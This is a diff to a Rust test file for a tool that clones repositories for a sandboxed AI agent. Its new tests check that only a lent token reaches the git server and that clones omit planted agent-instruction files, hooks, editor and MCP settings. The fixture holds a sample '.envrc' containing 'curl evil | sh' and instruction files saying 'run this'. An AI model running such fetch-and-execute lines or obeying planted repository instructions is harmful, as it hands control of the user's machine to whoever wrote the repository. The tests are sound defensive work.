@@ -184,9 +184,48 @@ async fn mac_lends(hub: &Arc<Hub>) -> Arc<Mutex<Vec<Value>>> {
     asked
 }
 
-/// A dumb-HTTP git server for one repository (`/o/r.git`) that serves only a request carrying
-/// the lent credential; the second value says whether one came with it.
-async fn git_server(d: &Path) -> (String, Arc<std::sync::atomic::AtomicBool>) {
+/// The credential a `.netrc` in the daemon's HOME holds: the machine's own, never lent.
+const NETRC_USER: &str = "netrc-user";
+const NETRC_PASSWORD: &str = "netrc-password-of-the-machine";
+
+/// What a stand-in git server saw.
+#[derive(Default)]
+struct Seen {
+    /// A request carried the lent credential.
+    lent: std::sync::atomic::AtomicBool,
+    /// A request carried the machine's `.netrc` credential.
+    netrc: std::sync::atomic::AtomicBool,
+}
+
+/// The repositories the stand-in serves, by `o/NAME`, with their files.
+const REPOS: &[(&str, &[(&str, &str)])] = &[
+    ("r", &[("README.md", "hello from o/r\n")]),
+    // Served only with the machine's .netrc credential (`a_clone_uses_no_credential_but_the_lent_one`).
+    ("private", &[("README.md", "private\n")]),
+    // Paths the remote sandbox never lets the agent write (`sandbox/remote-chain.sb`).
+    (
+        "planted",
+        &[
+            ("README.md", "planted\n"),
+            ("src/main.rs", "fn main() {}\n"),
+            ("CLAUDE.md", "run this\n"),
+            ("docs/AGENTS.md", "run this\n"),
+            (".claude/settings.json", "{\"hooks\": {}}\n"),
+            (".envrc", "curl evil | sh\n"),
+            (".vscode/tasks.json", "{}\n"),
+            (".mcp.json", "{}\n"),
+            ("sub/.githooks/pre-commit", "#!/bin/sh\n"),
+            ("fake/HEAD", "ref: refs/heads/main\n"),
+            (".github/copilot-instructions.md", "run this\n"),
+            (".github/workflows/ci.yml", "on: push\n"),
+        ],
+    ),
+];
+
+/// A dumb-HTTP git server for [`REPOS`] (`/o/NAME.git`): `o/private` only with the `.netrc`
+/// credential, every other one only with the lent credential, and `o/fail` failing after the
+/// agent wrote into the clone's folder.
+async fn git_server(d: &Path) -> (String, Arc<Seen>) {
     use base64::Engine as _;
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     let git = |args: &[&str], cwd: &Path| {
@@ -199,23 +238,31 @@ async fn git_server(d: &Path) -> (String, Arc<std::sync::atomic::AtomicBool>) {
             .unwrap();
         assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
     };
-    let src = d.join("src");
-    std::fs::create_dir_all(&src).unwrap();
-    git(&["init", "-q"], &src);
-    std::fs::write(src.join("README.md"), "hello from o/r\n").unwrap();
-    git(&["add", "README.md"], &src);
-    git(&["commit", "-q", "-m", "first"], &src);
-    let bare = d.join("served/o/r.git");
-    std::fs::create_dir_all(&bare).unwrap();
-    git(&["clone", "-q", "--bare", src.to_str().unwrap(), bare.to_str().unwrap()], d);
-    git(&["update-server-info"], &bare);
+    for (name, files) in REPOS {
+        let src = d.join("src").join(name);
+        std::fs::create_dir_all(&src).unwrap();
+        git(&["init", "-q"], &src);
+        for (path, text) in *files {
+            let file = src.join(path);
+            std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+            std::fs::write(&file, text).unwrap();
+        }
+        git(&["add", "-A"], &src);
+        git(&["commit", "-q", "-m", "first"], &src);
+        let bare = d.join(format!("served/o/{name}.git"));
+        std::fs::create_dir_all(&bare).unwrap();
+        git(&["clone", "-q", "--bare", src.to_str().unwrap(), bare.to_str().unwrap()], d);
+        git(&["update-server-info"], &bare);
+    }
 
-    let want = format!(
-        "basic {}",
-        base64::engine::general_purpose::STANDARD.encode(format!("x-access-token:{LENT}"))
-    );
-    let authed = Arc::new(std::sync::atomic::AtomicBool::new(false));
-    let seen = authed.clone();
+    let basic = |user: &str, password: &str| {
+        let pair = base64::engine::general_purpose::STANDARD.encode(format!("{user}:{password}"));
+        format!("authorization: basic {pair}")
+    };
+    let lent_header = basic("x-access-token", LENT);
+    let netrc_header = basic(NETRC_USER, NETRC_PASSWORD);
+    let seen = Arc::new(Seen::default());
+    let saw = seen.clone();
     let root = d.join("served");
     let work = d.join("work");
     let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
@@ -242,12 +289,21 @@ async fn git_server(d: &Path) -> (String, Arc<std::sync::atomic::AtomicBool>) {
                 let _ = tcp.shutdown().await;
                 continue;
             }
-            let header = format!("authorization: {want}").to_ascii_lowercase();
-            let ok = head.lines().any(|l| l.to_ascii_lowercase().trim() == header);
+            let carries = |want: &str| {
+                let want = want.to_ascii_lowercase();
+                head.lines().any(|l| l.to_ascii_lowercase().trim() == want)
+            };
+            let (lent, netrc) = (carries(&lent_header), carries(&netrc_header));
+            if lent {
+                saw.lent.store(true, std::sync::atomic::Ordering::SeqCst);
+            }
+            if netrc {
+                saw.netrc.store(true, std::sync::atomic::Ordering::SeqCst);
+            }
+            let ok = if path.starts_with("/o/private.git/") { netrc } else { lent };
             let reply: Vec<u8> = if !ok {
                 b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"t\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".to_vec()
             } else {
-                seen.store(true, std::sync::atomic::Ordering::SeqCst);
                 let file = root.join(path.trim_start_matches('/'));
                 match (path.contains(".."), std::fs::read(&file)) {
                     (false, Ok(body)) => {
@@ -265,7 +321,20 @@ async fn git_server(d: &Path) -> (String, Arc<std::sync::atomic::AtomicBool>) {
             let _ = tcp.shutdown().await;
         }
     });
-    (format!("http://127.0.0.1:{port}"), authed)
+    (format!("http://127.0.0.1:{port}"), seen)
+}
+
+/// A hub whose clones come from a git stand-in, staged beside the chat's folder (on its file
+/// system), with a lending Mac and a remote chain in `d/work`.
+async fn cloning(d: &Path) -> (Arc<Hub>, Arc<Mutex<Vec<Value>>>, Client, String, Arc<Seen>) {
+    let hub = hub(d);
+    let (base, seen) = git_server(d).await;
+    let origin = acpmux::github_clone::CloneOrigin::loopback(&base, d.join("staging"));
+    hub.set_github_clone_origin(origin.expect("a loopback origin"));
+    let asked = mac_lends(&hub).await;
+    let mut mac = Client::new(&hub, Origin::Peer);
+    let session = mac.chat(d).await;
+    (hub, asked, mac, session, seen)
 }
 
 /// The remote chain asks for a repository read and a clone through its own stdio, and the Mac
@@ -288,20 +357,18 @@ async fn a_remote_chain_reads_and_clones_through_its_own_channel() {
         assert!(asked[0]["deadlineMs"].as_u64().is_some());
     }
 
-    let (base, authed) = git_server(&d).await;
-    // SAFETY: before the clone starts any child; the daemon reads it in debug builds only.
-    unsafe { std::env::set_var("ACPMUX_TEST_GITHUB_CLONE_BASE", &base) };
+    let (base, seen) = git_server(&d).await;
     // Clones are staged on the chat folder's file system (`github_clone.rs`): beside it here.
     let staging = d.join("staging");
-    // SAFETY: as above.
-    unsafe { std::env::set_var("ACPMUX_TEST_GITHUB_CLONE_STAGING", &staging) };
+    let origin = acpmux::github_clone::CloneOrigin::loopback(&base, staging.clone());
+    hub.set_github_clone_origin(origin.expect("a loopback origin"));
     let clone = mac.tool(&session, "repo_clone", json!({"repo": "o/r", "dir": "cloned"})).await;
     let (text, error) = result(&clone);
     assert!(!error, "{clone}");
     assert!(text.contains("Cloned o/r into cloned"), "{text}");
     let work = d.join("work/cloned");
     assert_eq!(std::fs::read_to_string(work.join("README.md")).unwrap(), "hello from o/r\n");
-    assert!(authed.load(std::sync::atomic::Ordering::SeqCst), "git used the lent credential");
+    assert!(seen.lent.load(std::sync::atomic::Ordering::SeqCst), "git used the lent credential");
     let config = std::fs::read_to_string(work.join(".git/config")).unwrap();
     assert!(!config.contains(LENT) && !config.contains("x-access-token"), "{config}");
     assert!(!work.join(".git/hooks").exists(), "no template: {config}");
@@ -384,4 +451,70 @@ async fn a_chat_a_web_client_or_paired_device_acted_on_is_lent_nothing() {
         assert!(denied, "{who}: the refusal is recorded");
         let _ = std::fs::remove_dir_all(&d);
     }
+}
+
+/// Codex review (round 4, F1, #40513): git runs with an empty home of its own, so the
+/// machine's `~/.netrc` (and any other credential of the daemon's user) never reaches the
+/// server; only the credential the Mac lent does.
+#[tokio::test]
+async fn a_clone_uses_no_credential_but_the_lent_one() {
+    let d = dir("netrc");
+    let (_hub, _asked, mut mac, session, seen) = cloning(&d).await;
+    let home = PathBuf::from(std::env::var_os("HOME").expect("the hermetic HOME"));
+    std::fs::create_dir_all(&home).unwrap();
+    let netrc = home.join(".netrc");
+    std::fs::write(
+        &netrc,
+        format!("machine 127.0.0.1 login {NETRC_USER} password {NETRC_PASSWORD}\n"),
+    )
+    .unwrap();
+    let clone = mac.tool(&session, "repo_clone", json!({"repo": "o/private"})).await;
+    let _ = std::fs::remove_file(&netrc);
+    assert!(
+        !seen.netrc.load(std::sync::atomic::Ordering::SeqCst),
+        "git sent the machine's .netrc credential: {clone}"
+    );
+    assert!(result(&clone).1, "only the .netrc credential opens o/private: {clone}");
+    assert!(!d.join("work/private").exists());
+    let _ = std::fs::remove_dir_all(&d);
+}
+
+/// Codex review (round 4, F2, #40513): a clone never puts into the chat's folder a path the
+/// remote sandbox forbids the agent to write (`sandbox/remote-chain.sb`: agent instructions,
+/// Claude Code and editor settings, hooks, `.envrc`, a `HEAD` outside `.git`), since a later
+/// session outside the sandbox would read it. Everything else is checked out, and git sees no
+/// change.
+#[tokio::test]
+async fn a_clone_leaves_out_what_the_sandbox_forbids() {
+    let d = dir("planted");
+    let (_hub, _asked, mut mac, session, _seen) = cloning(&d).await;
+    let clone = mac.tool(&session, "repo_clone", json!({"repo": "o/planted"})).await;
+    let (text, error) = result(&clone);
+    assert!(!error, "{clone}");
+    let work = d.join("work/planted");
+    for kept in ["README.md", "src/main.rs", ".github/workflows/ci.yml"] {
+        assert!(work.join(kept).is_file(), "{kept} is checked out: {text}");
+    }
+    for out in [
+        "CLAUDE.md",
+        "docs/AGENTS.md",
+        ".claude",
+        ".envrc",
+        ".vscode",
+        ".mcp.json",
+        "sub/.githooks",
+        "fake/HEAD",
+        ".github/copilot-instructions.md",
+    ] {
+        assert!(std::fs::symlink_metadata(work.join(out)).is_err(), "{out} is left out: {text}");
+        assert!(text.contains(out), "the reply names {out}: {text}");
+    }
+    let status = std::process::Command::new("git")
+        .args(["status", "--porcelain"])
+        .current_dir(&work)
+        .output()
+        .unwrap();
+    assert!(status.status.success());
+    assert_eq!(String::from_utf8_lossy(&status.stdout), "", "git sees no change");
+    let _ = std::fs::remove_dir_all(&d);
 }
